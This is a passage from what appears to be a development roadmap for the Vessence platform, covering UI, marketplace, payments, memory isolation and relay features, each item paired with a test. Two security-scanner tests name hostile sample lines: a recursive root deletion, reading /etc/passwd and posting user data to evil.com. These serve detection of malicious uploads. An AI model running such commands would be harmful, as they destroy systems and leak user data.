  - **Test:** Accept permissions for essence A. Unload and reload A — no permission prompt appears (auto-accepted). Clear preferences and reload — prompt appears again. Verify preferences are per-essence (accepting A's permissions doesn't auto-accept B's).

---

## Phase 3: UI Overhaul

### 3.1 Website Redesign
- [ ] New landing page: Vessence platform overview (Jane + Amber + essences)
  - **Test:** Navigate to vessences.com. Page loads in under 3 seconds. Verify: hero section explains Vessence, sections for Jane, Amber, and essences each have descriptions and visuals. All links work. Mobile responsive (check at 375px width).
- [ ] Essence marketplace / store page (browse, search, categories)
  - **Test:** Navigate to the store page. Verify: at least 3 category tabs, search bar works (type "tax" — relevant results appear), grid of essence cards with name, rating, price. Pagination works if 20+ essences exist.
- [ ] Essence detail page (description, price, YouTube demo, reviews, buy/rent button)
  - **Test:** Click on an essence card. Detail page loads with: full description, price, embedded YouTube video (plays), reviews section (shows ratings), and a buy/rent button. All elements render correctly. Back button returns to store.
- [ ] User dashboard (loaded essences, purchase history, API key management)
  - **Test:** Log in and navigate to dashboard. Verify 3 sections: (1) loaded essences list with status, (2) purchase history with dates and amounts, (3) API key management with add/remove/mask functionality. Each section shows correct data for the logged-in user.
- [ ] Seller dashboard (published essences, revenue, reviews)
  - **Test:** Log in as a seller. Dashboard shows: (1) list of published essences with status, (2) revenue totals and per-essence breakdown, (3) recent reviews. Verify numbers match actual data. Revenue shows after platform cut (80%).
- [ ] Jane builder interface (spec interview via web)
  - **Test:** Navigate to the builder page. Start a new essence build — interview questions appear in a web form. Complete all 12 sections. Verify spec is generated and displayed. Click "Build" — essence is created. Entire flow works without CLI.
- [ ] Essence loader / switcher in the main app view
  - **Test:** From the main app, click the essence switcher. Verify: list of available essences, currently loaded ones are highlighted, click to load/unload. Loading triggers permission prompt. Switching essences updates the UI within 2 seconds.

### 3.2 Android App Redesign
- [ ] Home screen: list of loaded essences with role titles and status
  - **Test:** Open the app. Home screen shows a list of loaded essences with role title and status (active/inactive). Tap an essence — opens its UI. Verify the list updates when essences are loaded/unloaded.
- [ ] Essence store: browse and purchase essences
  - **Test:** Navigate to the store tab. Browse by category, search by name. Tap an essence — detail page appears. Tap "Buy" — payment flow initiates. Verify the store loads within 3 seconds on a typical Android device.
- [ ] Essence loader: download, accept permissions, activate
  - **Test:** Purchase an essence. Verify: download progress indicator, permissions prompt appears, accept — essence activates and appears on home screen. Decline — essence is downloaded but not activated.
- [ ] Per-essence UI rendering (not just chat)
  - **Test:** Load a `dashboard` type essence. Verify the app renders panels and widgets, not just a chat view. Load a `hybrid` type — verify chat + side panels. Load a `chat` type — standard chat. Each renders correctly with no overlapping elements.
- [ ] Jane interface for building essences from mobile
  - **Test:** Open the Jane builder from the app. Complete the 12-section interview via mobile. Verify: text input works, section navigation works, spec preview is readable on small screen. Build completes successfully from mobile.
- [ ] Settings: API key management, model selection per essence
  - **Test:** Navigate to Settings. Add an API key — it's saved and masked (shows last 4 chars). Delete a key — removed. Select a model for a specific essence — saved and used on next message. Verify settings persist after app restart.

### 3.3 Multi-Paradigm UI Renderer
- [ ] Parse `ui/layout.json` and render the correct view type
  - **Test:** Create 5 layout files, one for each type (chat, card_grid, form_wizard, dashboard, hybrid). Load each — renderer produces the correct view type. Invalid JSON — renderer shows an error message, doesn't crash.
- [ ] `chat` renderer — current chat interface (already exists)
  - **Test:** Load a `chat` type essence. Verify: message input, message history, send button, typing indicator all work. Send 20 messages — scrolling works. Verify no regressions from the existing chat implementation.
- [ ] `card_grid` renderer — responsive grid of cards with images, titles, actions
  - **Test:** Define 8 cards in `layout.json`. Renderer shows a grid. Desktop: 4 columns. Tablet: 2 columns. Mobile: 1 column. Each card has image, title, and action button. Click action — triggers the defined function.
- [ ] `form_wizard` renderer — step-by-step form with progress indicator
  - **Test:** Define a 5-step form wizard. Renderer shows step 1 with progress bar at 20%. Fill fields and click Next — step 2 shows, progress at 40%. Click Back — returns to step 1 with data preserved. Complete all 5 — submit triggers the defined action.
- [ ] `dashboard` renderer — panels, charts, calendar, stats widgets
  - **Test:** Define a dashboard with 4 widgets: stat counter, bar chart, calendar, and activity feed. Renderer shows all 4 in a grid. Stat counter shows a number. Chart renders with data. Calendar shows current month. Activity feed lists recent items.
- [ ] `hybrid` renderer — chat panel + side panels for data/actions
  - **Test:** Define a hybrid layout with chat on left and 2 panels on right. Renderer shows the split view. Chat works normally. Side panels display data and action buttons. Clicking a panel action can insert context into the chat.
- [ ] Support data bindings from layout.json to essence functions
  - **Test:** Define a dashboard widget bound to `get_stats()` function. On load, widget calls `get_stats()` and displays the returned data. Update the underlying data and refresh — widget shows new values. Invalid binding — shows "data unavailable" placeholder.
- [ ] Hot-reload UI when essence is switched
  - **Test:** View essence A's dashboard UI. Switch to essence B (chat type). Verify: within 1 second, dashboard disappears and chat appears. Switch back to A — dashboard reappears with its state. No UI artifacts or flashing during transition.

### 3.4 Jane Builder Interface
- [ ] Web-based spec interview UI (guided form, not just chat)
  - **Test:** Navigate to the builder page. Verify it's a structured form with labeled sections, not a freeform chat. Each section has input fields appropriate to the question type (text, select, multi-select, file upload).
- [ ] Section progress indicator (12 sections, show completion)
  - **Test:** Start a new build. Progress shows 0/12. Complete section 1 — shows 1/12. Skip to section 5 — shows 1/12 (only completed sections count). Complete all 12 — shows 12/12 with visual completion indicator (checkmarks or green fills).
- [ ] Spec preview and edit before approval
  - **Test:** Complete all sections. Click "Preview Spec". Full spec appears in a formatted view. Click "Edit" on any section — returns to that section's form with existing answers pre-filled. Make a change and preview again — change is reflected.
- [ ] One-click "Build" button after spec approval
  - **Test:** After previewing spec, click "Approve". A "Build" button appears. Click it — build process starts. Verify only one click is needed (no confirmation dialog unless there are warnings). Button is disabled during build to prevent double-clicks.
- [ ] Build progress indicator (folder creation, knowledge ingestion, validation)
  - **Test:** Click Build. Progress indicator shows: "Creating folder structure... done", "Generating manifest... done", "Ingesting knowledge... done", "Validating... done". Each step transitions in real-time. Final state shows "Build complete" with a link to the new essence.

---

## Phase 4: Marketplace Backend

### 4.1 Account System
- [ ] User registration (email + password, or social login)
  - **Test:** Register with email+password — account created, confirmation email sent. Register with Google OAuth — account created instantly. Attempt duplicate email — error "Email already registered". Weak password (<8 chars) — rejected with specific criteria message.
- [ ] User profiles (display name, bio, avatar)
  - **Test:** Create profile with display name "TaxPro", bio "Tax expert", and upload avatar (PNG, 200x200). All fields save and display on the profile page. Edit each field — changes persist. Upload oversized avatar (10MB) — resized or rejected with size limit message.
- [ ] Seller verification (optional, adds trust badge)
  - **Test:** Apply for verification as a seller. Submit required documents. After approval, a "Verified" badge appears on the profile and all published essences. Non-verified sellers do not have the badge. Verify badge is visible on store listings.
- [ ] Role management (buyer, seller, or both)
  - **Test:** New user defaults to "buyer". Click "Become a Seller" — role updates to "both". Verify seller dashboard becomes accessible. A "buyer-only" user cannot access the seller dashboard or publish essences.
- [ ] Session management and auth tokens
  - **Test:** Log in — receive JWT token. Make API calls with token — authorized. Wait for token expiry (e.g., 24h) — next call returns 401. Refresh token — new token issued. Log out — token is invalidated, subsequent calls return 401.
- [ ] API key vault (users store their LLM API keys securely)
  - **Test:** Store a Claude API key. Verify it's saved encrypted (check database — value is not plaintext). Retrieve key for use — decrypted correctly and works for API calls. Delete key — removed from storage. Verify key is never exposed in API responses (masked as "sk-...xxxx").

### 4.2 Essence Publishing Flow
- [ ] Seller uploads essence folder (or Jane publishes directly)
  - **Test:** Upload a zip file containing a valid essence folder. Server extracts and stores it. Jane publishes directly by calling the publish API with the essence path. Both methods result in the essence appearing in the review queue. Upload an invalid zip (corrupted) — error message returned.
- [ ] Platform validates manifest schema and folder structure
  - **Test:** Upload essence with valid manifest — passes validation. Upload with missing `manifest.json` — rejected with "Missing manifest.json". Upload with invalid manifest (wrong schema) — rejected with specific field errors. Upload with missing required folders — rejected listing missing folders.
- [ ] AI security review — scan for malicious patterns, unsafe code, data exfiltration
  - **Test:** Upload essence with `os.system("rm -rf /")` in custom tools — flagged as malicious. Upload with `requests.post("evil.com", data=user_data)` — flagged as data exfiltration. Upload clean essence — passes security review. Verify review report lists specific findings.
- [ ] AI usability review — verify essence loads, responds, and functions correctly
  - **Test:** Upload a well-built essence — AI loads it, sends 3 test messages, verifies responses are coherent and match personality. Upload an essence with broken custom tool — AI reports "Function X throws RuntimeError". Verify review includes conversation transcript.
- [ ] If review passes, essence is listed on marketplace
  - **Test:** Upload a clean, functional essence. Both security and usability reviews pass. Verify the essence appears on the marketplace store page within 5 minutes. It has a listing with name, description, and price from the manifest.
- [ ] If review fails, seller gets detailed feedback on what to fix
  - **Test:** Upload an essence that fails security review. Seller receives feedback with: (1) which check failed, (2) which file and line number, (3) what to fix. Verify feedback is actionable (not just "failed"). Seller can fix and re-upload.

### 4.3 Purchase & Download
- [ ] Essence listing page with description, price, reviews, YouTube link
  - **Test:** View a listing page. Verify: description matches manifest, price is displayed in USD, reviews section shows star ratings and text, YouTube link opens a video. All elements render on desktop and mobile.
- [ ] One-click purchase button
  - **Test:** Click "Buy" on a listing. Payment modal appears. Enter card details and confirm — purchase completes in one flow. Verify no additional pages or redirects required. Button shows "Purchased" after completion.
- [ ] Payment processing (Stripe integration)
  - **Test:** Complete a purchase with Stripe test card (4242...). Verify: Stripe dashboard shows the charge, amount matches listing price. Test declined card (4000000000000002) — error message displayed, no purchase recorded. Webhook updates purchase status.
- [ ] 20% platform cut applied automatically, 80% to seller
  - **Test:** Essence priced at $10.00. After purchase, Stripe dashboard shows: platform receives $2.00, seller receives $8.00 (or equivalent Stripe Connect split). Verify seller dashboard shows $8.00 revenue for this sale.
- [ ] Essence folder delivered as download (zip) or auto-installed into Amber
  - **Test:** After purchase, user clicks "Download" — zip file downloads containing the complete essence folder. OR click "Install" — essence is automatically loaded into Amber. Verify downloaded zip passes the CLI validator. Auto-install triggers permissions flow.
- [ ] Purchase history stored in user account
  - **Test:** Purchase 3 essences. Navigate to dashboard → purchase history. All 3 appear with: essence name, purchase date, amount paid. Verify entries persist across sessions. Sort by date — most recent first.

### 4.4 Rental / Hosted Essences
- [ ] Creator registers a hosted essence (provides endpoint URL)
  - **Test:** Register a hosted essence with URL `https://creator.example.com/essence`. Platform verifies the endpoint responds (health check). Registration succeeds. Register with a dead URL — rejected with "Endpoint unreachable".
- [ ] Platform proxies user requests to creator's hosted Amber
  - **Test:** Send a message to a hosted essence. Verify the platform forwards the request to the creator's endpoint and returns the response. Check latency — proxy adds no more than 500ms overhead. Verify request/response payloads are correctly relayed.
- [ ] Rental pricing (per-use, per-hour, per-month — creator sets terms)
  - **Test:** Creator sets pricing to $0.10/use. User sends 5 messages — billed $0.50. Creator changes to $5/month — user is billed monthly. Verify pricing displays correctly on the listing page. Test all 3 pricing models.
- [ ] 20% platform cut on rental revenue
  - **Test:** Hosted essence earns $100 in a month. Platform retains $20, creator receives $80. Verify the split in both platform and seller dashboards. Test with small amounts ($0.10) — split rounds correctly.
- [ ] Usage tracking and billing
  - **Test:** Use a hosted essence 10 times. Check usage logs — exactly 10 entries with timestamps. Check billing — amount matches 10 × per-use price. Monthly summary email includes usage breakdown. Verify tracking is accurate across timezone boundaries.
- [ ] SLA / uptime monitoring for hosted essences
  - **Test:** Platform pings the hosted endpoint every 5 minutes. If 3 consecutive pings fail, essence is marked "Degraded" on the listing. If 10 fail, marked "Offline". Creator receives an alert email. Verify uptime percentage is calculated correctly (e.g., 99.5% over 30 days).

### 4.5 Review System
- [ ] First 50 buyers get 100% refund if they submit a review
  - **Test:** Have buyers 1-50 each submit a review — all receive automatic refunds. Buyer 51 submits a review — no refund. Verify refund appears in Stripe dashboard. Verify buyer 50's purchase shows "Refunded" in purchase history.
- [ ] Claude judges whether each review is "solid and fair" before approving refund
  - **Test:** Submit 5 reviews: (1) "Great tool, saved me hours on taxes" — fair, (2) "sucks" — unfair, (3) "Detailed analysis of features with pros and cons" — fair, (4) "Free refund lol" — unfair, (5) "Works well for basic filings but crashes on complex returns" — fair. Verify Claude classifies at least 4/5 correctly.
- [ ] Reviews display on essence listing page (star rating + text)
  - **Test:** Submit 3 reviews with ratings 5, 4, and 3. Listing page shows all 3 reviews with star ratings and text. Average rating displays as 4.0. Reviews are sorted newest first. Verify star icons render correctly.
- [ ] Seller can respond to reviews
  - **Test:** Seller clicks "Respond" on a review and types a reply. Reply appears under the review on the listing page. Verify only the essence owner can respond (not other sellers). Seller can edit but not delete their response.
- [ ] Review aggregation (average rating, total reviews, recent trends)
  - **Test:** Add 20 reviews with various ratings. Listing shows: average rating (correct to 1 decimal), total count (20), and a trend indicator (e.g., "Trending up" if recent 5 reviews average higher than all-time). Verify numbers update in real-time when new reviews are added.

### 4.6 Skill Marketplace
- [ ] Separate section for reusable skill/tool components
  - **Test:** Navigate to the marketplace. Verify a "Skills" tab/section exists separate from "Essences". Skills have their own listings with name, description, and price. The section is not empty (at least placeholder content).
- [ ] Skill listing page (description, price, compatible essences)
  - **Test:** View a skill listing. Verify: description explains what the skill does, price is displayed, "Compatible with" section lists essence types or categories. All elements render correctly on desktop and mobile.
- [ ] Skill purchase and download
  - **Test:** Purchase a skill. Verify: payment processes via Stripe, skill file is downloadable as a zip, zip contains the skill code and a manifest. Install the skill into an existing essence — it integrates without errors.
- [ ] Skill integration into essence builder (Jane can browse and add skills during interview)
  - **Test:** During the Shared Skills interview section, Jane lists purchased skills alongside platform skills. User selects a purchased skill — it's added to the manifest. Generated essence includes the skill and it functions correctly.

### 4.7 Search & Discovery
- [ ] Category browsing (finance, health, education, productivity, entertainment, etc.)
  - **Test:** Click each category tab. Verify: (1) only essences tagged with that category appear, (2) at least 6 categories exist, (3) "All" shows everything. An essence tagged with 2 categories appears in both. Empty categories show "No essences yet" message.
- [ ] Full-text search across essence names, descriptions, capabilities
  - **Test:** Search "tax" — returns essences with "tax" in name, description, or capabilities. Search "file storage" — returns Life Librarian. Search "xyzzy" (no match) — shows "No results found". Search is case-insensitive. Results appear within 1 second.
- [ ] Sort by: rating, price, newest, most purchased
  - **Test:** Add 10 essences with varying ratings, prices, and purchase counts. Sort by rating — highest first. Sort by price — lowest first. Sort by newest — most recently published first. Sort by most purchased — highest count first. Verify each sort produces the correct order.
- [ ] Filter by: price range, model compatibility, free/paid, view type
  - **Test:** Set price filter $0-$5 — only free and cheap essences shown. Filter "free only" — only $0 essences. Filter by model "Claude" — only essences with Claude as preferred. Filter by view "dashboard" — only dashboard-type essences. Combine filters — intersection of all applies.

---

## Phase 5: Quality & Trust

### 5.1 Automated Essence Testing Pipeline
- [ ] Build a test harness that loads the essence into a sandboxed Amber
  - **Test:** Run the test harness on a valid essence. Verify: essence loads in an isolated environment, has no access to production data, and runs within a sandbox (cannot write outside its folder). Check that the sandbox tears down after testing.
- [ ] Run the essence through basic interaction scenarios (conversation starters, key functions)
  - **Test:** Provide an essence with 3 conversation starters and 2 custom functions. Harness sends each starter and calls each function. Verify: all 5 interactions complete without errors. Report shows pass/fail per interaction with response text.
- [ ] Verify custom functions execute without errors
  - **Test:** Test an essence with 3 custom functions: (1) works correctly, (2) throws ValueError, (3) hangs for 30s. Report shows: (1) pass, (2) fail with "ValueError: ..." message, (3) fail with "Timeout after 10s". All 3 are tested regardless of individual failures.
- [ ] Verify UI layout renders correctly
  - **Test:** Test an essence with a `dashboard` layout. Harness renders the UI and checks: no JavaScript errors, all panels present, no overlapping elements, responsive at 3 viewport sizes (mobile, tablet, desktop). Report includes screenshots or render status.
- [ ] Check for common security patterns (subprocess calls, file access outside essence folder, network exfiltration)
  - **Test:** Scan an essence with: `subprocess.call`, `open("/etc/passwd")`, `requests.post("http://evil.com")`. Each is flagged with file path and line number. Scan a clean essence — zero security findings. Verify the scanner catches at least 10 known-bad patterns.
- [ ] Generate a test report with pass/fail per check
  - **Test:** Run the full pipeline on an essence. Report output is structured (JSON or markdown) with: overall status, per-check pass/fail, timestamps, error details for failures. Report is saved to a file and returned to the caller. Verify report is human-readable.
- [ ] Block publishing if critical checks fail
  - **Test:** Upload an essence that fails the security scan. Verify: publishing is blocked, seller sees "Publishing blocked: security check failed" with details. Upload an essence that fails usability but passes security — also blocked. Only fully passing essences can publish.

### 5.2 Claude Review Judge
- [ ] Implement a Claude-based review evaluator
  - **Test:** Call the evaluator with a review text and essence description. Verify it returns a JSON response with `verdict` ("fair" or "unfair") and `reasoning` (non-empty string). Call with 10 diverse reviews — all return valid responses within 5 seconds each.
- [ ] Input: review text + essence description
  - **Test:** Pass review "Excellent tax tool!" with description "AI tax accountant". Verify both inputs are included in the prompt to Claude. Pass empty review text — returns "unfair" with reasoning "Empty review". Pass very long review (2000 chars) — processes successfully.
- [ ] Output: "fair" or "unfair" with reasoning
  - **Test:** Verify output schema: `{verdict: "fair"|"unfair", reasoning: string}`. No other verdict values are possible. Reasoning is at least 20 characters long. Verify output is consistent — same review evaluated twice produces the same verdict.
- [ ] Fair reviews: specific, constructive, describe actual usage experience
  - **Test:** Submit: "I used this for my 2024 filing. The deduction finder saved me $500 but the state tax calculator was slow." Verdict: "fair". Reasoning mentions specificity and usage experience. Verify 5 similar reviews all classified as fair.
- [ ] Unfair reviews: one-word, spammy, irrelevant, or obviously gaming the refund
  - **Test:** Submit: (1) "bad" — unfair, (2) "BUY MY ESSENCE AT..." — unfair (spam), (3) "The weather is nice today" — unfair (irrelevant), (4) "just getting my refund lol" — unfair (gaming). Verify all 4 are classified as unfair with appropriate reasoning.
- [ ] Automatically approve refund for fair reviews, flag unfair ones for manual review
  - **Test:** Submit a fair review — refund is processed automatically within 1 minute. Submit an unfair review — refund is NOT processed, and the review appears in an admin queue labeled "Flagged for manual review". Verify the admin can then approve or deny the refund.

### 5.3 Seller Trust
- [ ] Track seller metrics (number of essences, average rating, refund rate)
  - **Test:** Create a seller with 3 essences (ratings 4.5, 3.0, 4.0) and 10% refund rate. Verify dashboard shows: essence count = 3, average rating = 3.83, refund rate = 10%. Publish a new essence — count updates to 4. New review — average recalculates.
- [ ] Optional seller verification (identity confirmation)
  - **Test:** Seller applies for verification. Admin reviews and approves — "Verified" badge appears. Admin rejects — seller notified with reason. Verify badge appears on profile and all published essences. Non-verified sellers can still publish.
- [ ] Seller badge system (new, established, top seller)
  - **Test:** New seller (0 sales) — "New Seller" badge. Seller with 50+ sales and 4.0+ rating — "Established" badge. Seller with 200+ sales and 4.5+ rating — "Top Seller" badge. Verify badges update automatically when thresholds are crossed.
- [ ] Flag sellers with high refund rates or repeated failed reviews
  - **Test:** Seller has 50% refund rate — flagged in admin panel with "High refund rate" warning. Seller has 5+ unfair reviews in a row — flagged with "Review abuse suspected". Verify flags appear in admin dashboard and seller is notified.

---

## Phase 6: Memory & Data Management

### 6.1 Memory Port on Deletion
- [ ] Build a migration tool that reads all entries from an essence's ChromaDB
  - **Test:** Create an essence ChromaDB with 20 entries. Run the migration tool — it reads all 20. Verify output includes content, metadata, and embeddings for each entry. Run on empty ChromaDB — returns zero entries, no errors.
- [ ] Present a summary to the user ("This essence has 47 memories about your tax filings")
  - **Test:** Run migration on essence with 47 entries. Verify user sees a message including the count (47) and a brief topic summary. If essence has 0 entries, message says "This essence has no memories to migrate."
- [ ] If user accepts, copy all entries into `user_memories` with `source: "essence:<name>"` metadata
  - **Test:** Accept migration for essence "tax_guru" with 10 entries. Query `user_memories` with filter `source: "essence:tax_guru"` — returns exactly 10 entries. Verify content matches original. Verify existing user memories are not affected.
- [ ] If user declines, skip
  - **Test:** Decline migration. Query `user_memories` for `source: "essence:tax_guru"` — zero results. Verify the tool exits cleanly without modifying any data. Essence ChromaDB still exists (deletion happens in next step).
- [ ] Delete the essence folder after migration decision
  - **Test:** Accept or decline migration, then verify the essence folder is deleted. `ls essences/tax_guru` — "No such file or directory". Parent folder `essences/` still exists. Migration data (if accepted) persists in `user_memories`.

### 6.2 Essence-Specific Memory Management
- [ ] Each essence's ChromaDB follows the same short-term / long-term pattern as user memory
  - **Test:** Add a memory to an essence. Verify it goes into the short-term collection. Wait for triage — it moves to long-term. Verify both collections exist and follow the same naming convention as user memory (with essence prefix).
- [ ] Archivist runs on essence memory too (triages essence short-term → essence long-term)
  - **Test:** Add 5 short-term memories to an essence. Trigger the Archivist. Verify: important entries move to long-term, trivial ones are discarded. Check Archivist logs — they reference the essence name. User memory Archivist runs separately and is unaffected.
- [ ] Janitor consolidates essence long-term memory nightly
  - **Test:** Add 20 long-term memories to an essence, including 5 near-duplicates. Trigger the Janitor. Verify: duplicates are consolidated (count drops to ~17), content is preserved. Janitor logs mention the essence. User memory Janitor runs separately.
- [ ] Essence memory expiry rules follow the same 14-day TTL for short-term
  - **Test:** Add a short-term memory to an essence with a timestamp 15 days ago. Run cleanup — the memory is deleted (expired). Add one with timestamp 10 days ago — still exists. Verify TTL is exactly 14 days, same as user memory.

### 6.3 Data Backup & Export
- [ ] USB backup script includes all essence folders
  - **Test:** Run the USB backup script. Verify the backup contains the full `essences/` directory with all essence folders. Compare file counts — source and backup match. Restore from backup — all essences load correctly.
- [ ] Export individual essence as zip (for sharing, backup, or migration)
  - **Test:** Export essence "tax_guru" as zip. Verify: zip contains all files from `essences/tax_guru/`, including ChromaDB data. Zip size is reasonable. Unzip on another machine — CLI validator passes on the extracted folder.
- [ ] Import essence from zip (restore from backup or receive from another user)
  - **Test:** Import the exported zip. Verify: essence folder is created at `essences/tax_guru/`, all files are present, ChromaDB is intact. Load the imported essence — it works identically to the original. Import a duplicate — warns "Essence already exists" and asks to overwrite or rename.
- [ ] Validate imported essence against schema before loading
  - **Test:** Import a valid essence zip — passes validation and loads. Import a zip with invalid manifest — rejected with schema error details. Import a zip missing required files — rejected listing missing files. Validation runs before any files are written.

### 6.4 Memory Isolation Enforcement
- [ ] Verify that essence A cannot query essence B's ChromaDB
  - **Test:** Load essences A and B with distinct ChromaDB data. From essence A's context, attempt to query B's collection by name — returns an error or empty result, never B's data. Verify the isolation is enforced at the ChromaDB client level, not just by convention.
- [ ] Verify that essence ChromaDB queries don't leak into user memory queries
  - **Test:** Add a unique fact to essence ChromaDB only. Query user memory for that fact — not found. Add a unique fact to user memory only. Query essence memory — not found. Verify both directions of isolation.
- [ ] Add integration tests for memory isolation
  - **Test:** Run the integration test suite. Tests include: (1) cross-essence query returns empty, (2) essence-to-user leak returns empty, (3) user-to-essence leak returns empty, (4) loading/unloading doesn't affect other essence memories. All tests pass. Tests run in CI.
- [ ] Log any cross-essence memory access attempts as security events
  - **Test:** Attempt a cross-essence query. Check security log — entry exists with timestamp, source essence, target essence, and "ACCESS DENIED" status. Verify log format is structured (JSON). Verify no log entry for legitimate same-essence queries.

---

## Phase 7: Interaction Patterns & Automations

### 7.1 Conversation Starters
- [ ] Read `interaction_patterns.conversation_starters` from manifest on load
  - **Test:** Set 3 conversation starters in manifest. Load the essence. Call `get_conversation_starters()` — returns exactly 3 items matching the manifest. If field is missing from manifest, returns an empty list (no crash).
- [ ] Display as suggested action buttons in the UI
  - **Test:** Load an essence with 3 starters. Verify 3 buttons appear in the UI (web and Android). Each button shows the starter text. Buttons are visible without scrolling. Verify buttons disappear after the first user message (or persist — per design spec).
- [ ] Support both text prompts and action triggers (e.g., "Upload W-2" opens file picker)
  - **Test:** Define starters: (1) `{type: "text", value: "What's my refund?"}`, (2) `{type: "action", value: "upload_file", label: "Upload W-2"}`. Click (1) — sends text to chat. Click (2) — opens file picker. Verify both types work on web and Android.

### 7.2 Multi-Step Workflow Engine
- [ ] Parse `workflows/sequences/` JSON files
  - **Test:** Place 2 workflow JSON files in `sequences/`. Engine parses both and registers them. Call `get_available_workflows()` — returns 2 entries. Place an invalid JSON file — engine logs a warning and skips it without crashing.
- [ ] Define workflow schema: steps, conditions, branching, data collection
  - **Test:** Create a workflow with: 3 linear steps, a condition on step 2 (branch to step 2a or 2b based on user input), and data collection fields on each step. Validate against the schema — passes. Remove a required field — schema rejects with error.
- [ ] Render workflows as guided experiences (form wizard, step indicator)
  - **Test:** Start a 4-step workflow. UI shows step 1 with a progress indicator (1/4). Complete step 1 — progress shows 2/4. Complete all steps — "Complete" indicator. Verify each step renders its form fields and instructions correctly.
- [ ] Track workflow progress in `user_data/`
  - **Test:** Start a workflow, complete 2 of 4 steps, close the app. Reopen — workflow resumes at step 3 with steps 1-2 data preserved. Check `user_data/` — a progress file exists with step data. Complete the workflow — progress file is updated to "completed".
- [ ] Allow pausing and resuming workflows
  - **Test:** Start a workflow at step 2. Click "Pause" or navigate away. Return later — workflow is at step 2 with data intact. Verify pause timestamp is logged. Resume and complete — all data from before pause is included in the final result.

### 7.3 Proactive Triggers
- [ ] Parse `interaction_patterns.proactive_triggers` from manifest
  - **Test:** Set 2 triggers in manifest: (1) date-based "April 1st tax reminder", (2) condition-based "when storage is 90% full". Load essence — both triggers are registered. Call `get_active_triggers()` — returns 2 entries with correct type and parameters.
- [ ] Implement trigger evaluation engine (date-based, condition-based)
  - **Test:** Set a trigger for "today at current time + 1 minute". Wait 1 minute — trigger fires. Set a condition trigger "when value > 100". Set value to 50 — no fire. Set to 101 — fires. Verify triggers fire exactly once (not repeatedly) unless configured to repeat.
- [ ] Send notifications via Discord, web push, or Android notification
  - **Test:** Fire a trigger. Verify notification arrives on: (1) Discord channel (message from Amber), (2) web push (browser notification), (3) Android notification. All three show the trigger message. User can click to open the relevant essence.
- [ ] Trigger actions: send message, start workflow, display alert
  - **Test:** Configure 3 triggers with different actions: (1) send message "Tax deadline approaching" — message appears in chat, (2) start workflow "tax_filing" — workflow begins, (3) display alert — alert modal/toast appears. Verify each action type works.
- [ ] Allow users to snooze or disable individual triggers
  - **Test:** Click "Snooze" on a trigger notification — trigger re-fires after snooze period (e.g., 1 hour). Click "Disable" — trigger never fires again until re-enabled. Check settings — disabled trigger shows as "Off". Re-enable — trigger resumes.

### 7.4 External Credential Management
- [ ] On essence load, check which credentials are needed from manifest
  - **Test:** Manifest declares 2 credentials: "IRS_API_KEY" (required) and "ANALYTICS_KEY" (optional). On load, system checks user's credential store. If "IRS_API_KEY" is missing, user is prompted. If present, no prompt. Optional "ANALYTICS_KEY" missing — warn but proceed.
- [ ] Prompt user for missing credentials
  - **Test:** Load essence with missing required credential. Verify: a prompt appears with credential name, description, and an input field. User enters the key — stored and load continues. User cancels — load fails with "Required credential missing: IRS_API_KEY".
- [ ] Store credentials securely (encrypted in user preferences, not in essence folder)
  - **Test:** Store a credential via the prompt. Check user preferences file — credential is encrypted (not plaintext). Check essence folder — no credential file exists. Decrypt the credential programmatically — matches what the user entered.
- [ ] Pass credentials to custom functions at runtime
  - **Test:** Store "IRS_API_KEY" credential. Call a custom function that uses this key. Verify the function receives the decrypted key value. Call without the credential stored — function receives None or raises a clear error.
- [ ] Allow users to update or revoke credentials per essence
  - **Test:** Navigate to settings → credentials for essence A. Update "IRS_API_KEY" with a new value — old value is replaced. Click "Revoke" — credential is deleted. Next load prompts for the credential again. Verify updating A's credential does not affect B's credentials.

---

## Phase 8: Relay & Networking

### 8.1 Relay Server Deployment
- [ ] Deploy relay server to VPS at `relay.vessences.com`
  - **Test:** `curl https://relay.vessences.com/health` returns 200 with `{"status": "ok"}`. WebSocket connection to `wss://relay.vessences.com/ws` establishes successfully. Verify TLS certificate is valid.
- [ ] Add tunnel client to Docker compose (`docker-compose.yml` includes relay tunnel service)
  - **Test:** Run `docker compose up`. Verify the tunnel client container starts and connects to `relay.vessences.com`. Check logs — "Connected to relay" message appears. Android app can reach Docker instance via relay.
- [ ] Android app relay connection mode (connect via relay when not on LAN)
  - **Test:** Disconnect phone from home WiFi (use mobile data). Open app — detects LAN is unavailable, switches to relay mode. Send a message — response arrives via relay. Verify latency is under 2 seconds for relay round-trip.
- [ ] $5/month Stripe subscription for relay access
  - **Test:** User without subscription attempts relay connection — rejected with "Subscribe to relay for remote access". User subscribes via Stripe ($5/month) — relay connection succeeds. Cancel subscription — relay access stops at end of billing period.
- [ ] Auto-link: Google OAuth on both website and Docker onboarding
  - **Test:** Sign up on vessences.com with Google. Install Docker and run onboarding — sign in with same Google account. Verify Docker instance is linked to the web account. Relay authenticates using the shared Google identity. No manual token entry needed.

---

## Phase 9: Account System & Marketplace

### 9.1 Google OAuth & User Accounts
- [ ] Google OAuth signup on vessences.com
  - **Test:** Click "Sign in with Google" on vessences.com. Google OAuth flow completes. User account is created with Google name, email, and avatar. Second sign-in with same Google account — logs in, does not create duplicate.
- [ ] User profiles with avatar
  - **Test:** Navigate to profile page. Google avatar is displayed. User can upload a custom avatar (replaces Google one). Display name is editable. All changes persist after page reload.
- [ ] Seller profiles at `vessences.com/u/<username>`
  - **Test:** User sets username to "taxguru". Navigate to `vessences.com/u/taxguru` — public profile page loads showing published essences, ratings, and bio. Non-existent username returns 404. Username is unique (duplicate rejected).

### 9.2 Essence Publishing & Payments
- [ ] Essence publishing flow (upload, validate, AI review, list)
  - **Test:** Seller uploads essence zip. Platform validates manifest and folder structure. AI security and usability review runs. If passed, essence appears on marketplace within 5 minutes. If failed, seller gets detailed feedback.
- [ ] Stripe payment integration (20% platform cut)
  - **Test:** Buyer purchases $10 essence. Stripe processes payment. Platform receives $2, seller receives $8 (via Stripe Connect). Verify amounts in Stripe dashboard. Test with Stripe test cards (success and decline scenarios).
- [ ] Review system with Claude-judged fairness
  - **Test:** Buyer submits review "Great tool, saved me hours." Claude judges as fair — refund processed (if within first 50). Buyer submits "lol free money" — Claude judges unfair — no refund, flagged for manual review.
- [ ] First-50-buyers refund program
  - **Test:** Buyers 1-50 each submit a fair review — all receive automatic refunds. Buyer 51 submits fair review — no refund (program exhausted). Verify refund count is tracked per essence.

---

## Phase 10: Desktop Installers

### 10.1 Linux Installer
- [ ] Linux `.deb` installer wrapping Docker + Vessence
